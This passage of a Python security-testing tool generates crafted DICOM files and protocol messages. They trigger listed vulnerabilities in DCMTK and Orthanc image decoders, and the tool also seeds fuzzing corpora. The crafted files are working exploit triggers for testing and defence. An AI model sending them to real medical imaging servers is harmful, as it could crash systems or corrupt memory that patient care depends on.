            (b'UN', 'un_bytes', b'\x00' * 16),
        ):
            elems = [
                Element(0x0028, 0x0002, 'US', 1),
                Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
                Element(0x0028, 0x0010, 'US', 4),
                Element(0x0028, 0x0011, 'US', 4),
                Element(0x0028, 0x0100, 'US', 16),
                Element(0x0028, 0x0101, 'US', 16),
                Element(0x0028, 0x0102, 'US', 15),
                Element(0x0028, 0x0103, 'US', 0),
                # VOI LUT Sequence as a non-SQ VR — the type-confusion trigger.
                Element.raw(tag=0x00283010, vr=vr, value=blob),
                Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 32),
            ]
            results.append(AttackResult(
                name=f'cve_2024_28130_{name}_voi_lut_not_sequence',
                category='cve',
                payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems),
                                                 EXPLICIT_LE),
                description=f'VOI LUT Sequence (0028,3010) encoded as {vr.decode()} '
                            'instead of SQ',
                expected_behavior='dcmpstat must type-check (0028,3010) before '
                                  'casting to a sequence',
                metadata={'cve': 'CVE-2024-28130', 'product': 'DCMTK',
                          'delivery_hint': 'cstore',
                          'bug_class': 'type-confusion',
                          'target_func': 'DVPSSoftcopyVOI_PList::createFromImage',
                          'target_field': '(0028,3010) VOI LUT Sequence'}
            ))

        return results

    # -------------------------------------------------------------------------
    # CVE-2026-5441..5445: Orthanc image-decoder batch (CERT/CC VU#536588)
    # -------------------------------------------------------------------------

    @staticmethod
    def cve_2026_5441_5445_orthanc_image_decoder() -> List[AttackResult]:
        """
        Orthanc ``DicomImageDecoder`` batch, CERT/CC VU#536588, fixed in 1.12.11.

        The crafted-DICOM members of the CVE-2026-5437..5445 batch that live in
        Orthanc's image pipeline (the meta-header OOB CVE-2026-5437 is handled
        by :meth:`cve_2026_5437_meta_header_oob`; the gzip/zip/Content-Length
        DoS members 5438/5439/5440 are HTTP-layer and out of scope for a DICOM
        payload):

          * CVE-2026-5441 — ``DecodePsmctRle1`` (Philips PMSCT_RLE1) OOB read
          * CVE-2026-5442 — frame-size integer overflow when dimensions arrive
            as ``UL`` instead of ``US`` → heap overflow
          * CVE-2026-5443 — PALETTE COLOR width×height 32-bit multiply overflow
          * CVE-2026-5444 — embedded PAM image dimension arithmetic overflow
          * CVE-2026-5445 — ``DecodeLookupTable`` palette index past LUT size
        """
        EXPLICIT_LE = '1.2.840.10008.1.2.1'
        results = []

        # CVE-2026-5442: Rows/Columns delivered with VR UL (4-byte) instead of
        # the expected US (2-byte). A decoder that reads them as 32-bit and
        # multiplies into a frame size overflows. 0x00010001 reads as a huge US
        # pair / wrong-width value.
        elems = [
            Element(0x0028, 0x0002, 'US', 1),
            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
            Element.raw(tag=0x00280010, vr='UL', value=struct.pack('<I', 0x00010001)),  # Rows as UL
            Element.raw(tag=0x00280011, vr='UL', value=struct.pack('<I', 0x00010001)),  # Columns as UL
            Element(0x0028, 0x0100, 'US', 16),
            Element(0x0028, 0x0101, 'US', 16),
            Element(0x0028, 0x0102, 'US', 15),
            Element(0x0028, 0x0103, 'US', 0),
            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 64),
        ]
        results.append(AttackResult(
            name='cve_2026_5442_01_dimensions_as_ul',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
            description='Rows/Columns encoded as UL (0x00010001) instead of US, '
                        'overflowing frame-size arithmetic',
            expected_behavior='Decoder must validate Rows/Columns VR and bound '
                              'the frame-size product',
            metadata={'cve': 'CVE-2026-5442', 'product': 'Orthanc',
                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'integer-overflow',
                      'target_field': '(0028,0010/0011) Rows/Columns VR UL'}
        ))

        # CVE-2026-5443: PALETTE COLOR with oversized Rows×Columns whose 32-bit
        # product wraps, bypassing the size validation before allocation.
        desc = struct.pack('<HHH', 0, 0, 8)
        elems = [
            Element(0x0028, 0x0002, 'US', 1),
            Element(0x0028, 0x0004, 'CS', 'PALETTE COLOR'),
            Element(0x0028, 0x0010, 'US', 0x8000),           # Rows
            Element(0x0028, 0x0011, 'US', 0x8000),           # Columns (0x8000^2*... wraps)
            Element(0x0028, 0x0100, 'US', 8),
            Element(0x0028, 0x0101, 'US', 8),
            Element(0x0028, 0x0102, 'US', 7),
            Element(0x0028, 0x0103, 'US', 0),
            Element(0x0028, 0x1101, 'US', desc),
            Element(0x0028, 0x1102, 'US', desc),
            Element(0x0028, 0x1103, 'US', desc),
            Element.raw(tag=0x00281201, vr='OW', value=b'\x00' * 16),
            Element.raw(tag=0x00281202, vr='OW', value=b'\x00' * 16),
            Element.raw(tag=0x00281203, vr='OW', value=b'\x00' * 16),
            Element.raw(tag=0x7FE00010, vr='OW', value=b'\x00' * 64),
        ]
        results.append(AttackResult(
            name='cve_2026_5443_01_palette_color_dim_overflow',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
            description='PALETTE COLOR 32768×32768 whose 32-bit pixel-count '
                        'product overflows the size check',
            expected_behavior='PALETTE COLOR sizing must use overflow-checked '
                              'arithmetic',
            metadata={'cve': 'CVE-2026-5443', 'product': 'Orthanc',
                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'integer-overflow',
                      'target_field': '(0028,0010/0011) PALETTE COLOR dimensions'}
        ))

        # CVE-2026-5445: PALETTE COLOR pixel indices larger than the LUT size —
        # a small LUT (16 entries) with pixel values up to 255 indexes past the
        # table in DecodeLookupTable.
        desc16 = struct.pack('<HHH', 16, 0, 8)
        elems = [
            Element(0x0028, 0x0002, 'US', 1),
            Element(0x0028, 0x0004, 'CS', 'PALETTE COLOR'),
            Element(0x0028, 0x0010, 'US', 4),
            Element(0x0028, 0x0011, 'US', 4),
            Element(0x0028, 0x0100, 'US', 8),
            Element(0x0028, 0x0101, 'US', 8),
            Element(0x0028, 0x0102, 'US', 7),
            Element(0x0028, 0x0103, 'US', 0),
            Element(0x0028, 0x1101, 'US', desc16),
            Element(0x0028, 0x1102, 'US', desc16),
            Element(0x0028, 0x1103, 'US', desc16),
            Element.raw(tag=0x00281201, vr='OW', value=b'\x00' * 32),
            Element.raw(tag=0x00281202, vr='OW', value=b'\x00' * 32),
            Element.raw(tag=0x00281203, vr='OW', value=b'\x00' * 32),
            # Pixel values 0xFF index well past a 16-entry LUT.
            Element.raw(tag=0x7FE00010, vr='OW', value=b'\xFF' * 16),
        ]
        results.append(AttackResult(
            name='cve_2026_5445_01_palette_index_past_lut',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
            description='PALETTE COLOR pixel indices (0xFF) exceed the 16-entry '
                        'palette LUT',
            expected_behavior='DecodeLookupTable must clamp/validate indices '
                              'against the LUT length',
            metadata={'cve': 'CVE-2026-5445', 'product': 'Orthanc',
                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'oob-read',
                      'target_func': 'DicomImageDecoder::DecodeLookupTable',
                      'target_field': '(7FE0,0010) palette index vs LUT size'}
        ))

        # CVE-2026-5444: embedded PAM (Netpbm) image whose WIDTH/HEIGHT header
        # overflows buffer-size arithmetic during decode.
        pam = (b'P7\n'
               b'WIDTH 4294967295\n'
               b'HEIGHT 4294967295\n'
               b'DEPTH 1\n'
               b'MAXVAL 255\n'
               b'TUPLTYPE GRAYSCALE\n'
               b'ENDHDR\n') + b'\x00' * 16
        epd = EncapsulatedPixelData(transfer_syntax='1.2.840.10008.1.2.4.50')
        epd.clear_offset_table()
        epd.add_fragment(pam)
        pixel_elem = Element.raw(tag=0x7FE00010, vr='OB',
                                 value=epd.encode(), length=0xFFFFFFFF)
        elems = [
            Element(0x0028, 0x0002, 'US', 1),
            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
            Element(0x0028, 0x0010, 'US', 4),
            Element(0x0028, 0x0011, 'US', 4),
            Element(0x0028, 0x0100, 'US', 8),
            Element(0x0028, 0x0101, 'US', 8),
            Element(0x0028, 0x0102, 'US', 7),
            Element(0x0028, 0x0103, 'US', 0),
            pixel_elem,
        ]
        results.append(AttackResult(
            name='cve_2026_5444_01_embedded_pam_dim_overflow',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems),
                                             '1.2.840.10008.1.2.4.50'),
            description='Embedded PAM image declares WIDTH/HEIGHT 0xFFFFFFFF, '
                        'overflowing decode size arithmetic',
            expected_behavior='PAM decode must bound WIDTH×HEIGHT before '
                              'allocation',
            metadata={'cve': 'CVE-2026-5444', 'product': 'Orthanc',
                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'integer-overflow',
                      'target_field': 'embedded PAM WIDTH/HEIGHT'}
        ))

        # CVE-2026-5441: Philips PMSCT_RLE1 proprietary compression. Structural
        # trigger — the private creator + compression marker steer Orthanc into
        # DecodePsmctRle1, with crafted escape markers near the buffer end.
        rle_escape = b'\xa5\x5a' * 8 + b'\x00\xa5'  # escape-marker run, truncated
        elems = [
            Element(0x0028, 0x0002, 'US', 1),
            Element(0x0028, 0x0004, 'CS', 'MONOCHROME2'),
            Element(0x0028, 0x0010, 'US', 8),
            Element(0x0028, 0x0011, 'US', 8),
            Element(0x0028, 0x0100, 'US', 16),
            Element(0x0028, 0x0101, 'US', 16),
            Element(0x0028, 0x0102, 'US', 15),
            Element(0x0028, 0x0103, 'US', 0),
            # Philips ELSCINT1 private block declaring PMSCT_RLE1 compression.
            Element.raw(tag=0x07a10010, vr='LO', value=b'ELSCINT1'),
            Element.raw(tag=0x07a11011, vr='LO', value=b'PMSCT_RLE1'),
            Element.raw(tag=0x7FE00010, vr='OW', value=rle_escape),
        ]
        results.append(AttackResult(
            name='cve_2026_5441_01_pmsct_rle1_escape_markers',
            category='cve',
            payload=CVEAttacks._image_part10(CVEAttacks._ds_bytes(elems), EXPLICIT_LE),
            description='Philips PMSCT_RLE1 private compression with escape '
                        'markers running off the end of the buffer',
            expected_behavior='DecodePsmctRle1 must bound escape-marker reads to '
                              'the buffer',
            metadata={'cve': 'CVE-2026-5441', 'product': 'Orthanc',
                      'cve_batch': 'CVE-2026-5437..5445', 'bug_class': 'oob-read',
                      'target_func': 'DicomImageDecoder::DecodePsmctRle1',
                      'target_field': '(07a1,1011) PMSCT_RLE1 + Pixel Data',
                      'note': 'structural trigger'}
        ))

        return results

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield every CVE attack payload (flattened from lists)."""
        yield from cls.cve_2023_32135_sequence_uaf()
        yield from cls.cve_2024_24793_duplicate_meta_tags()
        yield from cls.cve_2024_24794_sequence_duplicates()
        yield from cls.cve_2019_11687_polyglot()
        yield from cls.cve_2026_50003_cget_bit_preserving_path_traversal()
        yield from cls.cve_2026_50254_storescp_association_leak()
        yield from cls.cve_2026_35505_association_request_leak()
        yield from cls.cve_2026_52868_worklist_directory_escape()
        yield from cls.cve_2026_44628_worklist_type_confusion()
        yield from cls.cve_2026_3650_gdcm_vr_memory_leak()
        yield from cls.cve_2026_5437_meta_header_oob()
        yield from cls.cve_2026_10528_dcmitem_read_stack()
        yield from cls.cve_2026_32711_dicomdir_traversal()
        yield from cls.cve_2022_2121_null_deref()
        yield from cls.cve_2025_14607_bytestring_corruption()
        yield from cls.cve_2024_47796_determine_minmax_oob()
        yield from cls.cve_2015_8979_dul_string_overflow()
        # GDCM codec CVEs (Talos) — crafted-.dcm pixel/codec triggers.
        yield from cls.cve_2024_22391_gdcm_lut_setlut()
        yield from cls.cve_2024_25569_gdcm_rawcodec_oob()
        yield from cls.cve_2025_48429_gdcm_rle_numsegments()
        yield from cls.cve_2024_22373_gdcm_jpeg2000_oob()
        yield from cls.cve_2025_52582_gdcm_overlay_oob()
        yield from cls.cve_2025_11266_gdcm_encapsulated_fragment_underflow()
        yield from cls.cve_2015_8396_gdcm_imageregionreader_int_overflow()
        # DCMTK dcmpstat type confusion (Talos).
        yield from cls.cve_2024_28130_dcmtk_voi_lut_type_confusion()
        # Orthanc image-decoder batch (CERT/CC VU#536588).
        yield from cls.cve_2026_5441_5445_orthanc_image_decoder()


# =============================================================================
# Protocol Seed Generator - emit varied PDU payloads for an AFL/AFLNet corpus
# =============================================================================

class ProtocolSeedGenerator:
    """
    Emit varied A-ASSOCIATE-RQ / C-STORE-RQ payloads.

    This is a seed generator, not a fuzzer: it produces a finite set of
    payloads with no coverage feedback. Use it to seed an AFL++/AFLNet
    corpus (grey-box) or as one-shot black-box DAST probes. The actual
    mutation loop belongs to AFL++/AFLNet.

    Example:
        for result in ProtocolSeedGenerator.fuzz_association(count=100):
            deliver.send_pdu(target, result.payload)
    """

    @staticmethod
    def fuzz_association(count: int = 100) -> Generator[AttackResult, None, None]:
        """Yield fuzzed A-ASSOCIATE-RQ payloads."""
        for i in range(count):
            try:
                pdu_bytes = raw(fuzz(DICOM() / A_ASSOCIATE_RQ()))
                mutation = 'scapy_fuzz'

                yield AttackResult(
                    name=f'fuzz_assoc_{i}',
                    category='fuzzer',
                    payload=pdu_bytes,
                    description=f'Fuzzed A-ASSOCIATE-RQ #{i}',
                    expected_behavior='Target should handle gracefully',
                    metadata={'mutation': mutation},
                )
            except Exception as e:
                yield AttackResult(
                    name=f'fuzz_assoc_{i}',
                    category='fuzzer',
                    payload=b'',
                    description=f'Generation error: {e}',
                    expected_behavior='N/A',
                    success=False,
                    metadata={'error': str(e)},
                )

    @staticmethod
    def fuzz_cstore(sop_class_uid: str = None,
                    count: int = 100) -> Generator[AttackResult, None, None]:
        """Yield fuzzed C-STORE-RQ payloads."""
        sop_class = sop_class_uid or CT_IMAGE_STORAGE_SOP_CLASS_UID

        for i in range(count):
            try:
                if i % 5 == 0:
                    cmd = C_STORE_RQ(
                        command_group_length=random.choice([0, 10, 0xFFFF, 0xFFFFFFFF]),
                        affected_sop_class_uid=_uid_to_bytes(sop_class),
                        affected_sop_instance_uid=f'1.2.3.{i}'.encode(),
                        message_id=random.randint(1, 65535),
                    )
                    mutation = 'group_length'
                elif i % 5 == 1:
                    cmd = C_STORE_RQ(
                        command_group_length=100,
                        affected_sop_class_uid=b'1.2.3.4.5',
                        affected_sop_instance_uid=b'1.2.3.4.5.6.7',
                        message_id=1,
                    )
                    mutation = 'odd_length_uid'
                elif i % 5 == 2:
                    cmd = C_STORE_RQ(
                        affected_sop_class_uid=sop_class,
                        affected_sop_instance_uid=f'1.2.3.{i}',
                        message_id=1,
                    )
                    cmd.command_field = 0xDEAD
                    mutation = 'invalid_command'
                else:
                    cmd = fuzz(C_STORE_RQ())
                    cmd.affected_sop_class_uid = sop_class
                    cmd.affected_sop_instance_uid = f'1.2.3.{i}'
                    mutation = 'scapy_fuzz'

                yield AttackResult(
                    name=f'fuzz_cstore_{i}',
                    category='fuzzer',
                    payload=raw(cmd),
                    description=f'Fuzzed C-STORE-RQ #{i}',
                    expected_behavior='Target should handle gracefully',
                    metadata={'mutation': mutation},
                )
            except Exception as e:
                yield AttackResult(
                    name=f'fuzz_cstore_{i}',
                    category='fuzzer',
                    payload=b'',
                    description=f'Generation error: {e}',
                    expected_behavior='N/A',
                    success=False,
                    metadata={'error': str(e)},
                )

    @classmethod
    def all(cls, count: int = 10) -> Generator[AttackResult, None, None]:
        """Yield seed payloads from both the association and cstore generators."""
        yield from cls.fuzz_association(count=count)
        yield from cls.fuzz_cstore(count=count)


# Deprecated alias - kept for backward compatibility.
ProtocolFuzzer = ProtocolSeedGenerator


# =============================================================================
# Targeted Seed Generator - pydicom-structure-aware corpus emitter
# =============================================================================

class TargetedSeedGenerator:
    """
    Generate structure-aware seed payloads from a real pydicom dataset.

    Uses pydicom to understand a dataset's structure, then emits targeted
    corruptions of it. Like ProtocolSeedGenerator this is a seed emitter,
    not a fuzzing engine - feed its output to AFL++ as a corpus, or deliver
    it as black-box DAST probes.
    """
    
    def __init__(self, pydicom_dataset):
        """Initialize with pydicom dataset."""
        self.source = pydicom_dataset
        self.corruptor = Corruptor(pydicom_dataset)
    
    def target_vr_parser(self, vr: str) -> Generator[AttackResult, None, None]:
        """Generate attacks targeting specific VR parser."""
        invalid_vrs = ['XX', '\x00\x00', 'ZZ', '!!', '  ']
        
        for tag in self.source.keys():
            elem = self.source[tag]
            if hasattr(elem, 'VR') and elem.VR == vr:
                for invalid_vr in invalid_vrs:
                    c = Corruptor(self.source)
                    c.set_vr(tag, invalid_vr)
                    
                    yield AttackResult(
                        name=f'vr_fuzz_{tag}_{invalid_vr}',
                        category='targeted',
                        payload=c.encode(),
                        description=f'Tag {tag} VR changed from {vr} to {invalid_vr}',
                        expected_behavior='Parser should handle gracefully',
                        metadata={'tag': tag, 'original_vr': vr, 'fuzzed_vr': invalid_vr}
                    )
    
    def target_length_handling(self) -> Generator[AttackResult, None, None]:
        """Generate length-based attacks on each element."""
        lengths = [0, 1, 0xFFFF, 0xFFFFFFFF]
        
        for tag in self.source.keys():
            for length in lengths:
                c = Corruptor(self.source)
                c.set_length(tag, length)
                
                yield AttackResult(
                    name=f'length_fuzz_{tag}_{length:#x}',
                    category='targeted',
                    payload=c.encode(),
                    description=f'Tag {tag} length set to {length:#x}',
                    expected_behavior='Parser should detect length issues',
                    metadata={'tag': tag, 'fuzzed_length': length}
                )
    
    def target_pixel_data(self) -> Generator[AttackResult, None, None]:
        """Generate pixel data attacks if present."""
        if (0x7FE0, 0x0010) not in self.source:
            return
        
        # Corrupt dimensions
        for val in [0, 1, 0xFFFF]:
            c = Corruptor(self.source)
            if (0x0028, 0x0010) in self.source:
                c.set_raw_value((0x0028, 0x0010), struct.pack('<H', val))

            yield AttackResult(
                name=f'pixel_rows_{val}',
                category='targeted',
                payload=c.encode(),
                description=f'Rows set to {val}',
                expected_behavior='Parser should validate dimensions',
                metadata={'rows': val}
            )


# Deprecated alias - kept for backward compatibility.
TargetedFuzzer = TargetedSeedGenerator


# =============================================================================
# Combined Attacks - Dataset + Protocol together
# =============================================================================

class CombinedAttacks:
    """
    Combined attacks that pair a corrupted dataset with C-STORE delivery
    metadata. Pure payload generators — no network I/O.

    Use ``deliver.send_cstore`` to deliver these over the network.
    """

    @staticmethod
    def corrupt_store(dataset_attack: AttackResult,
                      sop_class_uid: str = None,
                      sop_instance_uid: str = '1.2.3.4.5') -> AttackResult:
        """C-STORE payload with corrupted dataset."""
        sop_class = sop_class_uid or CT_IMAGE_STORAGE_SOP_CLASS_UID
        return AttackResult(
            name='corrupt_store',
            category='combined',
            payload=dataset_attack.payload,
            description=f'C-STORE with {dataset_attack.name}',
            expected_behavior='Target should reject corrupt dataset',
            metadata={
                'inner_attack': dataset_attack.name,
                'delivery': 'cstore',
                'sop_class_uid': sop_class,
                'sop_instance_uid': sop_instance_uid,
            },
        )

    @staticmethod
    def zero_length_dataset() -> AttackResult:
        """C-STORE with empty dataset."""
        return CombinedAttacks.corrupt_store(
            AttackResult(
                name='zero_length',
                category='combined',
                payload=b'',
                description='Empty dataset',
                expected_behavior='Should reject',
            ),
        )

    @staticmethod
    def bitflip_corruption(dataset: bytes,
                           flip_count: int = 10) -> AttackResult:
        """C-STORE with random bit flips."""
        corrupted = bytearray(dataset)
        for _ in range(min(flip_count, len(corrupted))):
            idx = random.randint(0, len(corrupted) - 1)
            corrupted[idx] ^= random.randint(1, 255)

        return CombinedAttacks.corrupt_store(
            AttackResult(
                name='bitflip',
                category='combined',
                payload=bytes(corrupted),
                description=f'{flip_count} random bit flips',
                expected_behavior='Should handle gracefully',
            ),
        )

    @classmethod
    def all(cls) -> Generator[AttackResult, None, None]:
        """Yield combined attack payloads."""
        yield cls.zero_length_dataset()
